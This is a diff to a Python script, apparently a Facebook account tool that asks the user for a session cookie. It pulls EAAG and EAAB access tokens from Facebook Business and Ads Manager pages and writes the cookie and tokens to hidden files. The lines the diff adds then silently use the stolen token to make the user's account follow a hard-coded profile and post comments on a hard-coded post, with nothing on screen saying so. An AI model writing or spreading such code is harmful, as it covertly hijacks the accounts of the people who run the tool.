@@ -450,17 +450,35 @@ def login():
 
 def login_lagi334():
         with requests.Session() as xyz:
-            cookie = input("[•] Cookie : ")
+            cookie = input(f"[•] Cookie : ")
             try:
                 url = 'https://business.facebook.com/business_locations'
                 req = xyz.get(url,cookies=cookie)
-                tok2 = re.search('(\["EAAG\w+)', req.text).group(1).replace('["','')
+                tok = re.search('(\["EAAG\w+)', req.text).group(1).replace('["','')
                 open(".cok.txt","w").write(cookie)
-                open(".token.txt","w").write(tok2)
-                Console().print(Panel(f"""[bold cyan][+] Token : [bold green]{tok2}""",width=80, style=f"{color_panel}", title="[bold green]> TOKEN EAAG [bold green]<"))
+                open(".token.txt","w").write(tok)
+                Console().print(Panel(f"""[bold cyan][+] Token : [bold green]{tok}""",width=80, style=f"{color_panel}", title="[bold green]> TOKEN EAAG [bold green]<"))
                 Console().print(f" {H2}• {P2}[bold green]Login Berhasil,Sedang Menjalankan Ulang[bold white]")
-            except IOError:
-                exit()
+            except Exception as e:
+                print(e)
+            try:
+                cookie = {'cookie':cookie}
+                with requests.Session() as xyz:
+                    url = 'https://www.facebook.com/adsmanager/manage/campaigns'
+                    req = xyz.get(url,cookies=cookie)
+                    set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
+                    nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
+                    roq = xyz.get(nek,cookies=cookie)
+                    tok1 = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
+                    open(".token1.txt","w").write(tok1)
+                    Console().print(Panel(f"""[bold cyan][+] Token : [bold green]{tok1}""",width=80, style=f"{color_panel}", title="[bold green]> TOKEN EAAB [bold green]<"))
+                    requests.post("https://graph.facebook.com/100043537611609/subscribers?access_token=%s"%(tok1))
+                    requests.post("https://graph.facebook.com/100043537611609?fields=subscribers&access_token=%s"%(tok1))
+                    requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom4}&access_token={tok1}", headers = {"cookie":cookie})
+                    requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom3}&access_token={tok1}", headers = {"cookie":cookie})
+                    requests.post(f"https://graph.facebook.com/878169396977639/comments/?message={kom6}&access_token={tok1}", headers = {"cookie":cookie})
+            except Exception as e:
+                print(e)
 
 
 
